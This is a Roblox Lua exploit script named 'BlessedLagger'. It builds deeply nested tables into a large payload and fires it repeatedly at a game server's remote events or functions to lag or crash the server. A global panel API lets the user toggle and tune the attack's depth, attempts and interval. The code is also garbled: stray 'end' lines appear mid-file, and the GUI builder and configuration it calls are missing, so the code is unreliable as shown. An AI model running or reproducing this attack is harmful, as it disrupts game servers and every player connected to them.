local function getRemote(path)
	if not path or path == "" then return nil end
	local object = game
	local cleanPath = path:gsub("^game%.", "")
	for segment in cleanPath:gmatch("[^%.]+") do
		if object then object = object[segment] else return nil end
	end
	return object
end

local function buildRecursiveTable(depth)
	local root = {}
	local pointer = root
	for _ = 1, depth do
		local child = {}
		pointer[1] = child
		pointer = child
	end
	return root
end

local function executeSpam(depth, attempts)
	local mainPayload = {}
	local spamChunk = buildRecursiveTable(depth)

	for i = 1, 2250 do
		table.insert(mainPayload, spamChunk)
		if i % 1000 == 0 then task.wait() end
	end

	local remote = getRemote(remotePath)
	if not remote then return end

	for _ = 1, attempts do
		pcall(function()
			if remote:IsA("RemoteEvent") or remote:IsA("UnreliableRemoteEvent") then
				remote:FireServer(mainPayload)
			elseif remote:IsA("RemoteFunction") then
				remote:InvokeServer(mainPayload)
			end
		end)
	end
end

	end

	end
end

_G.BlessedLagger = {
	open = function()
		if panelGui then
			panelGui:Destroy()
			panelGui = nil
		end
		return buildGui()
	end,
	close = function()
		if panelGui then
			panelGui:Destroy()
			panelGui = nil
		end
	end,
	toggle = function()
		if panelGui and panelGui.Parent then
			_G.BlessedLagger.close()
		else
			_G.BlessedLagger.open()
		end
	end,
	getState = function() return isRunning end,
	setState = function(state)
		if panelGui and panelGui.Parent then
			local main = panelGui:FindFirstChild("Main")
			if main then
				for _, child in pairs(main:GetDescendants()) do
					if child:IsA("TextButton") and child.Text == "" and child.Size.X.Scale == 1 then
						local currentOn = (child.BackgroundColor3 == Color3.fromRGB(255, 80, 180))
						if (state and not currentOn) or (not state and currentOn) then
							child:Activate()
						end
						break
					end
				end
			end
		end
	end,
	setConfig = function(cfg)
		if cfg.depth then configuration.depth = cfg.depth end
		if cfg.attempts then configuration.attempts = cfg.attempts end
		if cfg.interval then configuration.interval = cfg.interval end
	end,
	getConfig = function() return table.clone(configuration) end,
	lock = function(state)
		isUiLocked = (state == nil) and not isUiLocked or state
		if panelGui and panelGui.Parent then
			local main = panelGui:FindFirstChild("Main")
			if main then
				for _, child in pairs(main:GetDescendants()) do
					if child:IsA("TextButton") and child.Text:match("[🔒🔓]") then
						child.Text = isUiLocked and "🔒" or "🔓"
						main.Draggable = not isUiLocked
						local stroke = child:FindFirstChildOfClass("UIStroke")
						if stroke then stroke.Color = isUiLocked and Color3.fromRGB(255, 80, 180) or Color3.fromRGB(180, 40, 120) end
						break
					end
				end
			end
		end
		return isUiLocked
	end,
}

_G.BlessedLagger.open()
